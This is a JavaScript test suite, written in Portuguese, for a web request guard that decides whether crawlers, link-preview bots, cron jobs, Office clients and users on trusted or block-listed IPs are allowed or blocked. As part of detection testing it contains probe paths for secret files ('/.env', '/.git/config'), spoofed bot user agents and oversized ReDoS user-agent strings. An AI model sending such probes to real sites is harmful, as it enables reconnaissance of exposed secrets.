        const r = await rodar(g, req(H, caminho, { ua, ip: '66.249.' + (modo === 'proteger' ? 70 : 66) + '.' + (++i) }));
        const ev = c.eventos.at(-1);
        if (modo === 'proteger') bloqueio403(r, tipoDe(caminho));
        else assert.equal(r, null);
        assert.equal(ev.regra, 'buscador', ua);
        assert.equal(ev.decisao, modo === 'proteger' ? 'bloqueado' : 'observado');
        assert.match(ev.motivo, new RegExp('^buscador: ' + nome));
        conta(4);
      }
      for (const caminho of ['/robots.txt', '/manifest.json']) {
        assert.equal(await rodar(g, req(H, caminho, { ua, ip: '66.249.80.' + (++i) })), null, caminho + ' segue para o buscador');
        assert.equal(c.eventos.at(-1).decisao, 'liberado');
        conta(2);
      }
    }
  }
});

caso('prévia de link (WhatsApp, Telegram, Slack, Facebook, X, LinkedIn, Discord, Skype, Microsoft) e cron: liberados no proteger, mesmo sem cabeçalhos de navegador', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(lista({ modo: 'proteger', projeto: 'painel-lube-distribuidora', slug: null }));
  const H = 'painel-lube-distribuidora.vercel.app';
  const PREVIAS = [
    'WhatsApp/2.23.20.0', 'WhatsApp/2.2437.2 i', 'TelegramBot (like TwitterBot)',
    'Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)',
    'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)', 'Twitterbot/1.0',
    'LinkedInBot/1.0 (compatible; Mozilla/5.0; Apache-HttpClient +http://www.linkedin.com)',
    'Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5 skype-url-preview@microsoft.com',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0 MicrosoftPreview/2.0 +https://aka.ms/MicrosoftPreview',
  ];
  let i = 0;
  for (const ua of PREVIAS) {
    for (const metodo of ['GET', 'HEAD']) {
      assert.equal(await rodar(g, req(H, '/', { ua, metodo, ip: '31.13.' + (++i) + '.1', headers: SEM_NAVEGADOR })), null, ua);
      assert.equal(c.eventos.at(-1).decisao, 'liberado');
      assert.equal(c.eventos.at(-1).regra, 'previa_link');
      conta(3);
    }
  }
  assert.equal(await rodar(g, req(H, '/api/cron/atualizar', { ua: 'vercel-cron/1.0', ip: '76.76.21.9', headers: SEM_NAVEGADOR })), null);
  assert.equal(c.eventos.at(-1).regra, 'cron');
  assert.equal(await rodar(g, req(H, '/', { ua: 'vercel-cron/1.0', ip: '76.76.21.10', headers: SEM_NAVEGADOR })), null);
  assert.equal(c.eventos.at(-1).regra, 'cron');
  // prévia não fura o exige_login (só vê o redirect para o portal)
  const g2 = await novoGuarda();
  centralFalsa(lista({ modo: 'proteger', projeto: 'gestao-finaceiro', slug: 'gestao-financeiro', exige: true }));
  const r = await rodar(g2, req('gestao-finaceiro.vercel.app', '/', { ua: 'WhatsApp/2.23.20.0', headers: SEM_NAVEGADOR }));
  assert.equal(r.status, 302);
  conta(5);
});

caso('rede confiável (escritório): robô e buscador ignorados, não-navegador nem marca; ataque certo continua 403', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(lista({ modo: 'proteger', projeto: 'painel-lube-distribuidora', slug: null, confiaveis: [{ t: 'ip', v: '131.255.253.169' }] }));
  const H = 'painel-lube-distribuidora.vercel.app';
  const ip = '131.255.253.169';
  for (const [o, regra] of [[{ ua: 'Mozilla/5.0 (compatible)' }, 'robo'], [{ ua: 'Vercel MCP Fetch', caminho: '/a' }, 'robo'],
    [{ ua: 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)', caminho: '/b' }, 'buscador'],
    [{ headers: SEM_NAVEGADOR, caminho: '/c' }, null]]) {
    assert.equal(await rodar(g, req(H, o.caminho || '/', { ...o, ip })), null);
    const ev = c.eventos.at(-1);
    assert.equal(ev.decisao, 'liberado');
    assert.equal(ev.regra, regra);
    if (regra) assert.match(ev.motivo, /^rede confiável: .*\(ignorado\)$/);
    conta(3);
  }
  bloqueio403(await rodar(g, req(H, '/.git/config', { ip, headers: SEM_NAVEGADOR })), 'outro');
  assert.match(c.eventos.at(-1).motivo, /ataque partindo de rede confiável/);
  conta();
});

caso('Office e navegador simples (w3m, Lynx, NetSurf, UC Mini, leitor do Google, download do Android): liberados no portal; no fechado vão para o portal', async () => {
  const AGENTES = [
    ['HEAD', 'Microsoft Office Existence Discovery', 'office'],
    ['OPTIONS', 'Microsoft Office Protocol Discovery', 'office'],
    ['GET', 'Microsoft Office Excel 2014', 'office'],
    ['GET', 'Microsoft Office Word 2014', 'office'],
    ['GET', 'Mozilla/4.0 (compatible; ms-office; MSOffice 16)', 'office'],
    ['GET', 'Microsoft Office/16.0 (Windows NT 10.0; Microsoft Outlook 16.0.18925; Pro)', 'office'],
    ['GET', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36 (compatible; Google-Read-Aloud; +https://support.google.com/webmasters/answer/1061943)', 'navegador_simples'],
    ['GET', 'Lynx/2.9.0dev.12 libwww-FM/2.14 SSL-MM/1.4.1 GNUTLS/3.7.8', 'navegador_simples'],
    ['GET', 'w3m/0.5.3+git20230121', 'navegador_simples'],
    ['GET', 'Mozilla/5.0 (X11; Linux) NetSurf/3.11', 'navegador_simples'],
    ['GET', 'UCWEB/2.0 (Linux; U; Opera Mini/7.1.32052/30.3697; pt-BR; SM-J260M) U2/1.0.0 UCBrowser/10.9.8.1006 Mobile', 'navegador_simples'],
    ['GET', 'AndroidDownloadManager/14 (Linux; U; Android 14; SM-A546E Build/UP1A.231005.007)', 'navegador_simples'],
  ];
  const g = await novoGuarda();
  const c = centralFalsa(lista({ modo: 'proteger', projeto: 'painel-lube-distribuidora', slug: null }));
  const H = 'painel-lube-distribuidora.vercel.app';
  let i = 0;
  for (const [metodo, ua, regra] of AGENTES) {
    for (const headers of [{}, SEM_NAVEGADOR]) {
      assert.equal(await rodar(g, req(H, '/', { metodo, ua, headers, ip: '200.150.1.' + (++i) })), null, ua);
      const ev = c.eventos.at(-1);
      assert.equal(ev.decisao, 'liberado', ua);
      assert.equal(ev.regra, regra, ua);
      conta(3);
    }
  }
  // ataque continua barrado com UA de Office
  bloqueio403(await rodar(g, req(H, '/.env', { ua: 'Microsoft Office Word 2014', ip: '200.150.3.1' })), 'outro');
  assert.equal(c.eventos.at(-1).regra, 'varredura');
  conta();
  // no sistema fechado continuam sem login: 302 para o portal (GET/HEAD de página) ou 401
  const g2 = await novoGuarda();
  const c2 = centralFalsa(lista({ modo: 'proteger', projeto: 'painel-compras', slug: 'gestao-compras', exige: true }));
  for (const [metodo, ua] of AGENTES) {
    const r = await rodar(g2, req('painel-compras-rosy.vercel.app', '/', { metodo, ua, headers: SEM_NAVEGADOR, ip: '200.150.2.' + (++i) }));
    assert.equal(r.status, metodo === 'OPTIONS' ? 401 : 302, ua);
    assert.equal(c2.eventos.at(-1).regra, 'sem_login');
    conta(2);
  }
});

caso('exceção disfarçada: cliente HTTP, varredor ou buscador junto de prévia/cron/Office cai na regra de robô/buscador', async () => {
  const g = await novoGuarda();
  const c = centralFalsa(lista({ modo: 'proteger', projeto: 'painel-lube-distribuidora', slug: null }));
  const H = 'painel-lube-distribuidora.vercel.app';
  let i = 0;
  for (const [ua, regra, motivo] of [
    ['curl/8.5.0 WhatsApp/2.23', 'robo', 'user-agent de robô: curl'],
    ['python-requests/2.32.3 vercel-cron/1.0', 'robo', 'user-agent de robô: python-requests'],
    ['Go-http-client/1.1 facebookexternalhit/1.1', 'robo', 'user-agent de robô: go-http-client'],
    ['LinkedInBot/1.0 (compatible; Mozilla/5.0; Apache-HttpClient +http://www.linkedin.com) python-requests/2.32', 'robo', 'user-agent de robô: httpclient'],
    ['Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html) Slackbot', 'buscador', 'buscador: googlebot'],
    ['Mozilla/5.0 (compatible; CensysInspect/1.1) TelegramBot (like TwitterBot)', 'robo', 'varredor conhecido: censys'],
    ['Microsoft Office Word 2014 Go-http-client/1.1', 'robo', 'user-agent de robô: go-http-client'],
  ]) {
    for (const [metodo, caminho] of [['GET', '/'], ['POST', '/api/x']]) {
      bloqueio403(await rodar(g, req(H, caminho, { metodo, ua, ip: '45.90.0.' + (++i), headers: SEM_NAVEGADOR })), caminho === '/' ? 'outro' : 'api');
      const ev = c.eventos.at(-1);
      assert.equal(ev.regra, regra, ua);
      assert.equal(ev.motivo.replace(/ · incidente [0-9a-f]{8}$/, ''), motivo, ua);
      conta(3);
    }
  }
  // as de verdade continuam exceção (o LinkedIn declara Apache-HttpClient no próprio UA)
  for (const [ua, regra] of [['LinkedInBot/1.0 (compatible; Mozilla/5.0; Apache-HttpClient +http://www.linkedin.com)', 'previa_link'],
    ['vercel-cron/1.0', 'cron'], ['WhatsApp/2.23.20.0', 'previa_link']]) {
    assert.equal(await rodar(g, req(H, '/', { ua, ip: '45.91.0.' + (++i), headers: SEM_NAVEGADOR })), null, ua);
    assert.equal(c.eventos.at(-1).regra, regra);
    conta(2);
  }
});

caso('bloqueio suspeito da lista (IP dividido, CGNAT): com identidade segue observado; sem identidade 403; certo barra todos; confiável ignora', async () => {
  const g = await novoGuarda();
  const ate = new Date(Date.now() + 3600e3).toISOString();
  const { chave, c, H } = await cenarioLogin({ modo: 'proteger', bloqueios: [
    { id: 77, t: 'ip', v: '177.37.200.10', n: 'suspeito', ate },
    { id: 78, t: 'cidr', v: '2804:14c:1:2::/64', n: 'suspeito', ate },
    { id: 79, t: 'ip', v: '177.37.200.11', n: 'certo', ate },
    { id: 80, t: 'ip', v: '131.255.253.169', n: 'suspeito', ate },
  ], confiaveis: [{ t: 'ip', v: '131.255.253.169' }] });
  const cookie = '__Host-sentinela=' + (await assinarJwt(sessaoPayload(), chave));
  const app = { identidade: { email: 'ana@lube.com.br', origem: 'sessao_app' } };
  // pessoa com sessão da Sentinela ou login do app: segue, evento observado com a regra lista
  for (const [ip, caminho, o, opcoes, quem] of [
    ['177.37.200.10', '/', { cookie }, undefined, 'julio@lube.com.br'],
    ['177.37.200.10', '/api/dados', { cookie }, undefined, 'julio@lube.com.br'],
    ['2804:14c:1:2::99', '/', { cookie }, undefined, 'julio@lube.com.br'],
    ['177.37.200.10', '/relatorio', {}, app, 'ana@lube.com.br'],
  ]) {
    assert.equal(await rodar(g, req(H, caminho, { ...o, ip }), opcoes), null, ip + ' ' + caminho);
    const ev = c.eventos.at(-1);
    assert.equal(ev.decisao, 'observado');
    assert.equal(ev.regra, 'lista');
    assert.match(ev.motivo, /na lista de bloqueio #(77|78) \(suspeito\) · com login: não barrado$/);
    assert.equal(ev.identidade, quem);
    conta(5);
  }
  // sem identidade (ou sessão vencida): 403 lista, como antes
  const vencida = '__Host-sentinela=' + (await assinarJwt(sessaoPayload({ exp: Math.floor(Date.now() / 1000) - 5 }), chave));
  for (const ck of [undefined, vencida]) {
    bloqueio403(await rodar(g, req(H, '/x' + (ck ? 1 : 2), { cookie: ck, ip: '177.37.200.10' })), 'outro');
    assert.equal(c.eventos.at(-1).regra, 'lista');
    assert.equal(c.eventos.at(-1).identidade, null);
    conta(2);
  }
  // bloqueio certo barra mesmo com sessão e login do app
  bloqueio403(await rodar(g, req(H, '/', { cookie, ip: '177.37.200.11' })), 'outro');
  assert.equal(c.eventos.at(-1).regra, 'lista');
  bloqueio403(await rodar(g, req(H, '/y', { ip: '177.37.200.11' }), app), 'outro');
  // rede confiável com bloqueio suspeito: ignorado (liberado), com ou sem identidade
  assert.equal(await rodar(g, req(H, '/', { cookie, ip: '131.255.253.169' })), null);
  assert.equal(c.eventos.at(-1).decisao, 'liberado');
  assert.match(c.eventos.at(-1).motivo, /^rede confiável: .*\(ignorado\)$/);
  // com identidade, ataque certo continua 403 no IP com bloqueio suspeito
  bloqueio403(await rodar(g, req(H, '/.git/config', { cookie, ip: '177.37.200.10' })), 'outro');
  assert.equal(c.eventos.at(-1).regra, 'varredura');
  conta(6);
  // observar: com identidade também segue observado
  const g2 = await novoGuarda();
  const { chave: k2, c: c2, H: H2 } = await cenarioLogin({ modo: 'observar', bloqueios: [{ id: 81, t: 'ip', v: '177.37.200.12', n: 'suspeito', ate }] });
  const ck2 = '__Host-sentinela=' + (await assinarJwt(sessaoPayload(), k2));
  assert.equal(await rodar(g2, req(H2, '/', { cookie: ck2, ip: '177.37.200.12' })), null);
  assert.equal(c2.eventos.at(-1).decisao, 'observado');
  assert.equal(c2.eventos.at(-1).regra, 'lista');
  conta(3);
});

caso('UA hostil de 8 a 16 KB: as regras de robô seguem lineares (< 5 ms/req)', async () => {
  const g = await novoGuarda();
  centralFalsa(lista({ modo: 'proteger' }));
  const H = 'painel-compras-rosy.vercel.app';
  const ctx = { waitUntil(p) { p.catch(() => {}); } };
  await g.sentinela(req(H, '/'), ctx);
  const hostis = ['a'.repeat(16000), '@' + 'a'.repeat(16000), '@a'.repeat(8000), '(linux;'.repeat(2200), '(Linux; Android 14; ' + 'a'.repeat(16000),
    '(linux; android'.repeat(1000), 'Mozilla/5.0 ' + 'x'.repeat(16000), 'Mozilla/5.0 (' + ';'.repeat(16000), 'bo'.repeat(8000), 'cubo'.repeat(4000),
    'Mozilla/5.0 (Linux; Android 14; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36 ' + 'z'.repeat(15000),
    // parênteses e colchetes do semAparelho: abertos sem fechar, aninhados, "Android (" repetido
    '('.repeat(16000), '(a'.repeat(8000), '(a(b)'.repeat(3200), '((x)'.repeat(4000), '['.repeat(16000), '[a'.repeat(8000),
    'Android ('.repeat(1700), 'android'.repeat(2200), '(' + 'android'.repeat(2200), 'Mozilla/5.0 (' + '(x)'.repeat(5000)];
  let pior = 0;
  for (const ua of hostis) {
    for (let k = 0; k < 3; k++) await g.sentinela(req(H, '/', { ua, ip: '45.80.9.' + k }), ctx);   // aquece
    const t0 = performance.now();
    for (let k = 0; k < 10; k++) await g.sentinela(req(H, '/', { ua, ip: '45.80.0.' + k }), ctx);
    const ms = (performance.now() - t0) / 10;
    pior = Math.max(pior, ms);
    assert.ok(ms < 5, ua.slice(0, 24) + '…: ' + ms.toFixed(2) + ' ms/req');
    conta();
  }
  console.log('        UA hostil de até 16 KB: pior ' + pior.toFixed(2) + ' ms/req');
});

const falhas = await executar('Sentinela · guarda · núcleo');
process.exit(falhas ? 1 : 0);
